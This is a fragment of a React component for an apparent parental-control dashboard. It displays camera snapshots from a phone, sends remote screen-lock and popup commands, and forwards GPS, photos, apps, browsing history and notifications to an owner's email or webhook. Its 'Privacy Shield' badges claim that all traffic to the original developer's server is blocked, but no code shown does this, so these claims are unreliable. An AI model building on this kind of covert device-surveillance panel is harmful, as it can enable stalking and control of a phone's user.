                    <div
                      key={cap.id}
                      className="rounded-xl bg-[#0F131D] border border-slate-800 overflow-hidden flex flex-col"
                    >
                      <div className="aspect-4/3 w-full bg-black relative">
                        <img
                          src={cap.base64Image}
                          alt="Snapshot"
                          className="w-full h-full object-cover"
                        />
                        <span className="absolute top-2 left-2 px-2 py-0.5 rounded bg-black/70 text-[10px] font-mono text-cyan-400">
                          {cap.cameraType} LENS
                        </span>
                      </div>
                      <div className="p-3 text-[11px] text-slate-400 flex items-center justify-between">
                        <span>Taken: {cap.timestamp}</span>
                        <span className="text-emerald-400 font-semibold">Uploaded</span>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {/* TAB: COMMANDS (LOCK & MESSAGE CONTROL) */}
        {activeTab === 'commands' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            <div className="p-5 rounded-2xl bg-[#141A26] border border-slate-800 max-w-2xl mx-auto">
              <div className="flex items-center gap-2 mb-2">
                <Lock className="w-5 h-5 text-[#5C7CFA]" />
                <h3 className="text-base font-bold text-slate-100">Send Remote Command to Device</h3>
              </div>
              <p className="text-xs text-slate-400 mb-6">
                Broadcasts a Socket.IO &lsquo;device:message&rsquo; payload to trigger the overlay or full lock screen.
              </p>

              <form onSubmit={handleSendCommand} className="space-y-4">
                {/* Command Mode Selector */}
                <div>
                  <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">
                    Action Type
                  </label>
                  <div className="grid grid-cols-2 gap-3">
                    <button
                      type="button"
                      onClick={() => {
                        setMessageType('BLOCK');
                        setMessageText('Waktunya beristirahat! Layar telah dikunci oleh orang tua.');
                      }}
                      className={`p-3 rounded-xl border text-left flex flex-col transition-all ${
                        messageType === 'BLOCK'
                          ? 'bg-red-500/10 border-red-500/50 text-red-300 ring-2 ring-red-500/20'
                          : 'bg-[#0F131D] border-slate-800 text-slate-400 hover:border-slate-700'
                      }`}
                    >
                      <div className="flex items-center gap-2 font-bold text-xs">
                        <Lock className="w-3.5 h-3.5 text-red-400" />
                        <span>BLOCK (Screen Lock)</span>
                      </div>
                      <span className="text-[11px] text-slate-400 mt-1">
                        Locks device screen, requires PIN password to unlock.
                      </span>
                    </button>

                    <button
                      type="button"
                      onClick={() => {
                        setMessageType('MESSAGE');
                        setMessageText('Halo, tolong telepon Ibu atau pulang sekarang.');
                      }}
                      className={`p-3 rounded-xl border text-left flex flex-col transition-all ${
                        messageType === 'MESSAGE'
                          ? 'bg-indigo-500/10 border-indigo-500/50 text-indigo-300 ring-2 ring-indigo-500/20'
                          : 'bg-[#0F131D] border-slate-800 text-slate-400 hover:border-slate-700'
                      }`}
                    >
                      <div className="flex items-center gap-2 font-bold text-xs">
                        <MessageSquare className="w-3.5 h-3.5 text-indigo-400" />
                        <span>MESSAGE (Popup Alert)</span>
                      </div>
                      <span className="text-[11px] text-slate-400 mt-1">
                        Shows a standard popup alert with an &lsquo;OK&rsquo; button.
                      </span>
                    </button>
                  </div>
                </div>

                {/* Message Input */}
                <div>
                  <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-1">
                    Message Body
                  </label>
                  <textarea
                    rows={3}
                    value={messageText}
                    onChange={(e) => setMessageText(e.target.value)}
                    className="w-full px-3 py-2.5 rounded-xl bg-[#0F131D] border border-slate-700 text-sm text-slate-200 placeholder-slate-500 focus:outline-hidden focus:border-[#5C7CFA]"
                  />
                </div>

                {/* PIN Code for BLOCK mode */}
                {messageType === 'BLOCK' && (
                  <div>
                    <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-1">
                      Parent Unlock PIN Password
                    </label>
                    <input
                      type="text"
                      value={unlockPassword}
                      onChange={(e) => setUnlockPassword(e.target.value)}
                      placeholder="e.g. 1234 or 2026"
                      className="w-full px-3 py-2.5 rounded-xl bg-[#0F131D] border border-slate-700 text-sm font-mono text-slate-200 focus:outline-hidden focus:border-red-500"
                    />
                    <p className="text-[11px] text-slate-500 mt-1">
                      The child will need to enter this exact password on their screen to unlock the phone.
                    </p>
                  </div>
                )}

                {/* Submit button */}
                <button
                  type="submit"
                  className={`w-full py-3 px-4 rounded-xl text-white text-sm font-semibold flex items-center justify-center gap-2 shadow-lg transition-colors ${
                    messageType === 'BLOCK'
                      ? 'bg-red-600 hover:bg-red-500 shadow-red-600/20'
                      : 'bg-[#5C7CFA] hover:bg-[#4d6de8] shadow-indigo-600/20'
                  }`}
                >
                  <Send className="w-4 h-4" />
                  <span>
                    {messageType === 'BLOCK'
                      ? 'Dispatch Screen Lock to Device'
                      : 'Send Message to Device'}
                  </span>
                </button>
              </form>
            </div>
          </div>
        )}

        {/* TAB: PRIVACY & DATA REDIRECTION */}
        {activeTab === 'privacy' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            {/* Header / Guarantee Banner */}
            <div className="p-5 rounded-2xl bg-gradient-to-br from-[#0e2118] via-[#101824] to-[#121620] border border-emerald-500/30">
              <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
                <div className="flex items-start gap-3.5">
                  <div className="w-12 h-12 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center shrink-0 text-emerald-400">
                    <Shield className="w-6 h-6" />
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                      <h3 className="text-base font-bold text-slate-100">
                        Privacy Shield &amp; User Data Redirection
                      </h3>
                      <span className="px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 text-[10px] font-bold border border-emerald-500/40">
                        ACTIVE &amp; ENFORCED
                      </span>
                    </div>
                    <p className="text-xs text-slate-300 mt-1 max-w-2xl leading-relaxed">
                      All device telemetry (location coordinates, camera photos, app usage, browsing history, and notifications)
                      is redirected strictly to you. Any outbound network requests attempting to contact the original developer's server
                      (<span className="font-mono text-amber-300">api.irnhakim.my.id</span>) are automatically intercepted and terminated.
                    </p>
                  </div>
                </div>

                <div className="flex flex-wrap items-center gap-2 w-full md:w-auto">
                  <button
                    onClick={handleDispatchToUser}
                    disabled={isDispatching}
                    className="px-3.5 py-2 rounded-xl bg-emerald-500 hover:bg-emerald-600 disabled:opacity-50 text-slate-950 font-bold text-xs flex items-center justify-center gap-2 transition-colors shadow-lg shadow-emerald-950"
                  >
                    {isDispatching ? (
                      <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                    ) : (
                      <Send className="w-3.5 h-3.5" />
                    )}
                    <span>Send Telemetry to Me Now</span>
                  </button>

                  <button
                    onClick={handleDownloadDataPackage}
                    className="px-3 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 text-xs font-semibold flex items-center gap-1.5 transition-colors"
                  >
                    <Download className="w-3.5 h-3.5 text-slate-300" />
                    <span>Download JSON</span>
                  </button>
                </div>
              </div>

              {dispatchToast && (
                <div className="mt-4 p-3 rounded-lg bg-emerald-500/20 border border-emerald-500/40 text-xs text-emerald-300 flex items-center gap-2">
                  <CheckCircle2 className="w-4 h-4 shrink-0 text-emerald-400" />
                  <span>{dispatchToast}</span>
                </div>
              )}
            </div>

            {/* Metrics Triad */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              {/* Card 1: Developer Traffic */}
              <div className="p-4 rounded-2xl bg-[#141A26] border border-red-500/20 relative overflow-hidden">
                <div className="flex items-center justify-between text-xs text-slate-400 mb-2">
                  <span className="font-medium flex items-center gap-1 text-red-400">
                    <ShieldAlert className="w-3.5 h-3.5" />
                    Developer Exfiltration
                  </span>
                  <span className="px-1.5 py-0.5 rounded bg-red-500/10 text-red-400 text-[10px] font-bold border border-red-500/30">
                    100% BLOCKED
                  </span>
                </div>
                <div className="text-2xl font-bold text-slate-100 font-mono">
                  {privacySettings.totalBlockedAttempts}
                  <span className="text-xs font-sans text-slate-400 font-normal ml-2">leaks blocked</span>
                </div>
                <p className="text-[11px] text-slate-400 mt-2 font-mono">
                  Blocked Host: api.irnhakim.my.id
                </p>
                <div className="text-[10px] text-emerald-400 mt-1 flex items-center gap-1">
                  <Check className="w-3 h-3" />
                  0 bytes ever transmitted to developer
                </div>
              </div>

              {/* Card 2: User Destination */}
              <div className="p-4 rounded-2xl bg-[#141A26] border border-emerald-500/20 relative overflow-hidden">
                <div className="flex items-center justify-between text-xs text-slate-400 mb-2">
                  <span className="font-medium flex items-center gap-1 text-emerald-400">
                    <Mail className="w-3.5 h-3.5" />
                    Active Recipient
                  </span>
                  <span className="px-1.5 py-0.5 rounded bg-emerald-500/10 text-emerald-400 text-[10px] font-bold border border-emerald-500/30">
                    USER ONLY
                  </span>
                </div>
                <div className="text-base font-bold text-emerald-300 font-mono break-all truncate">
                  {privacySettings.userEmail}
                </div>
                <p className="text-[11px] text-slate-400 mt-2">
                  Packets Redirected: <span className="font-mono text-slate-200 font-bold">{privacySettings.totalRedirectedPackets}</span>
                </p>
                <div className="text-[10px] text-slate-400 mt-1">
                  Routing: User Local Storage + Secure Portal
                </div>
              </div>

              {/* Card 3: Direct Telemetry Export */}
              <div className="p-4 rounded-2xl bg-[#141A26] border border-slate-800 relative overflow-hidden">
                <div className="flex items-center justify-between text-xs text-slate-400 mb-2">
                  <span className="font-medium flex items-center gap-1 text-indigo-400">
                    <Database className="w-3.5 h-3.5" />
                    Data Export &amp; Sync
                  </span>
                  <span className="text-[10px] text-slate-500">
                    {privacySettings.lastDispatchedAt ? `Synced ${privacySettings.lastDispatchedAt}` : 'Ready'}
                  </span>
                </div>
                <div className="flex items-center gap-2 mt-1">
                  <button
                    onClick={handleCopyTelemetryJson}
                    className="px-3 py-1.5 rounded-lg bg-[#0F131D] hover:bg-slate-800 border border-slate-700 text-xs text-slate-200 font-medium flex items-center gap-1.5 transition-colors"
                  >
                    <Copy className="w-3.5 h-3.5 text-indigo-400" />
                    <span>{copiedToast ? 'Copied!' : 'Copy Telemetry'}</span>
                  </button>
                  <button
                    onClick={handleDownloadDataPackage}
                    className="px-3 py-1.5 rounded-lg bg-[#0F131D] hover:bg-slate-800 border border-slate-700 text-xs text-slate-200 font-medium flex items-center gap-1.5 transition-colors"
                  >
                    <FileText className="w-3.5 h-3.5 text-emerald-400" />
                    <span>JSON Dump</span>
                  </button>
                </div>
                <p className="text-[10px] text-slate-400 mt-2">
                  Includes GPS coordinates, Photos, Installed Apps, Screen time, Notifications.
                </p>
              </div>
            </div>

            {/* Recipient Configuration Form */}
            <div className="p-5 rounded-2xl bg-[#141A26] border border-slate-800">
              <div className="flex items-center justify-between mb-4">
                <div>
                  <h4 className="text-sm font-bold text-slate-100 flex items-center gap-2">
                    <ShieldCheck className="w-4 h-4 text-emerald-400" />
                    Telemetry Recipient &amp; Forwarding Settings
                  </h4>
                  <p className="text-xs text-slate-400 mt-0.5">
                    Configure where all child device data is delivered. No data will ever reach the developer.
                  </p>
                </div>
              </div>

              <form onSubmit={handleSavePrivacySettings} className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-xs font-medium text-slate-300 mb-1.5">
                      Your Email (Owner &amp; Primary Recipient)
                    </label>
                    <input
                      type="email"
                      required
                      value={recipientEmail}
                      onChange={(e) => setRecipientEmail(e.target.value)}
                      placeholder="hackingforbug1@gmail.com"
                      className="w-full px-3 py-2 rounded-xl bg-[#0F131D] border border-slate-700 text-xs text-slate-100 font-mono focus:outline-hidden focus:border-emerald-500"
                    />
                    <p className="text-[11px] text-slate-500 mt-1">
                      All audit reports and exported snapshots are stamped with and routed to this address.
                    </p>
                  </div>

                  <div>
                    <label className="block text-xs font-medium text-slate-300 mb-1.5">
                      Custom Webhook / Personal Server (Optional)
                    </label>
                    <input
                      type="url"
                      value={webhookUrl}
                      onChange={(e) => setWebhookUrl(e.target.value)}
                      placeholder="https://your-webhook-endpoint.com/guardian"
                      className="w-full px-3 py-2 rounded-xl bg-[#0F131D] border border-slate-700 text-xs text-slate-100 font-mono focus:outline-hidden focus:border-emerald-500"
                    />
                    <p className="text-[11px] text-slate-500 mt-1">
                      Leave empty to use 100% private local storage (safest). Or enter your personal webhook.
                    </p>
                  </div>
                </div>

                <div className="pt-2 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
                    <span className="text-xs text-slate-300">
                      Developer endpoint (<code className="text-amber-300">irnhakim</code>) is permanently blocked in code.
                    </span>
                  </div>

                  <div className="flex items-center gap-2">
                    {privacySavedToast && (
                      <span className="text-xs text-emerald-400 font-medium animate-in fade-in flex items-center gap-1">
                        <Check className="w-3.5 h-3.5" />
                        Settings Saved
                      </span>
                    )}
                    <button
                      type="submit"
                      disabled={isSavingPrivacy}
                      className="px-4 py-2 rounded-xl bg-[#5C7CFA] hover:bg-[#4c6ef5] text-white text-xs font-bold transition-colors shadow-sm"
                    >
                      Save Recipient Settings
                    </button>
                  </div>
                </div>
              </form>
            </div>

            {/* Privacy Shield Audit Trail */}
            <div className="p-5 rounded-2xl bg-[#141A26] border border-slate-800">
              <div className="flex items-center justify-between mb-4">
                <div>
                  <h4 className="text-sm font-bold text-slate-100 flex items-center gap-2">
                    <Sliders className="w-4 h-4 text-indigo-400" />
                    Privacy Shield Security Audit Trail
                  </h4>
                  <p className="text-xs text-slate-400 mt-0.5">
                    Detailed log proving every packet was either blocked from developer or redirected to you.
                  </p>
                </div>
                <span className="text-xs text-slate-400 font-mono">
                  {privacyAudit.length} total security events
                </span>
              </div>

              <div className="space-y-2 max-h-80 overflow-y-auto font-mono text-xs">
                {privacyAudit.length === 0 ? (
                  <div className="py-8 text-center text-slate-500 font-sans text-xs">
                    Privacy Shield is active. All events will appear here in real time.
                  </div>
                ) : (
                  privacyAudit.map((entry) => (
                    <div
                      key={entry.id}
                      className={`p-3 rounded-xl border flex flex-col sm:flex-row sm:items-center justify-between gap-2 ${
                        entry.status === 'BLOCKED'
                          ? 'bg-red-950/20 border-red-500/30 text-red-300'
                          : 'bg-[#0F131D] border-slate-800 text-slate-300'
                      }`}
                    >
                      <div className="flex items-center gap-2.5 min-w-0">
                        <span
                          className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase shrink-0 ${
                            entry.status === 'BLOCKED'
                              ? 'bg-red-500/20 text-red-400 border border-red-500/40'
                              : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                          }`}
                        >
                          {entry.status === 'BLOCKED' ? 'EXFILTRATION BLOCKED' : 'USER REDIRECTED'}
                        </span>
                        <div className="min-w-0">
                          <div className="font-bold text-slate-200 text-xs truncate">
                            {entry.action}
                          </div>
                          <div className="text-[11px] text-slate-400 truncate">
                            From: <span className="text-slate-300">{entry.source}</span> → To:{' '}
                            <span className={entry.status === 'BLOCKED' ? 'text-amber-300 line-through' : 'text-emerald-300'}>
                              {entry.destination}
                            </span>
                          </div>
                        </div>
                      </div>

                      <div className="text-[11px] text-slate-500 shrink-0 self-end sm:self-auto">
                        {entry.timestamp}
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        )}

        {/* TAB: LOGS */}
        {activeTab === 'logs' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            <div className="p-5 rounded-2xl bg-[#141A26] border border-slate-800 font-mono text-xs">
              <div className="flex items-center justify-between mb-4">
                <div>
                  <h3 className="text-sm font-bold text-slate-200 font-sans">
                    Real-time Socket.IO &amp; REST Event Log
                  </h3>
                  <p className="text-xs text-slate-400 font-sans">
                    Live audit trail of bidirectional events between Child Device and Parent Portal.
                  </p>
                </div>
              </div>

              <div className="space-y-2 max-h-96 overflow-y-auto">
                {socketLogs.length === 0 ? (
                  <p className="text-slate-500 py-6 text-center">No socket events captured yet.</p>
                ) : (
                  socketLogs.map((log) => (
                    <div
                      key={log.id}
                      className="p-2.5 rounded-lg bg-[#0F131D] border border-slate-800/80 flex items-start gap-2"
                    >
                      <span
                        className={`px-1.5 py-0.5 rounded text-[10px] shrink-0 ${
                          log.direction === 'INCOMING'
                            ? 'bg-cyan-500/10 text-cyan-400'
                            : 'bg-purple-500/10 text-purple-400'
                        }`}
                      >
                        {log.direction}
                      </span>
                      <div className="flex-1 min-w-0">
                        <div className="flex justify-between">
                          <span className="font-bold text-indigo-300">{log.event}</span>
                          <span className="text-slate-500">{log.timestamp}</span>
                        </div>
                        <div className="text-slate-400 break-all text-[11px] mt-0.5">
                          {typeof log.payload === 'object'
                            ? JSON.stringify(log.payload)
                            : String(log.payload)}
                        </div>
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

interface TabButtonProps {
  active: boolean;
  onClick: () => void;
  icon: React.ReactNode;
  label: string;
}

const TabButton: React.FC<TabButtonProps> = ({ active, onClick, icon, label }) => {
  return (
    <button
      onClick={onClick}
      className={`px-3 py-2.5 text-xs font-medium border-b-2 flex items-center gap-1.5 whitespace-nowrap transition-colors ${
        active
          ? 'border-[#5C7CFA] text-[#5C7CFA]'
          : 'border-transparent text-slate-400 hover:text-slate-200'
      }`}
    >
      {icon}
      <span>{label}</span>
    </button>
  );
};
